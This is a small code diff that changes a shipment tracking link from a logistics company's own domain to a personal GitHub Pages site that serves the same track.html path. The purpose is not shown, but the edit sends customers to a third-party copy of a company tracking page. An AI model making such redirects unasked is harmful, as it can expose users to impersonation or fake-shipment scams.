@@ -409,7 +409,7 @@ if (
 ) {
 
     const trackingURL =
-        "https://www.americangloballogistics.com/track.html?tracking=" +
+        "https://mildredmwandizi34-cell.github.io/Hello-world-/track.html?tracking=" +
         encodeURIComponent(
             shipment.trackingNumber
         );
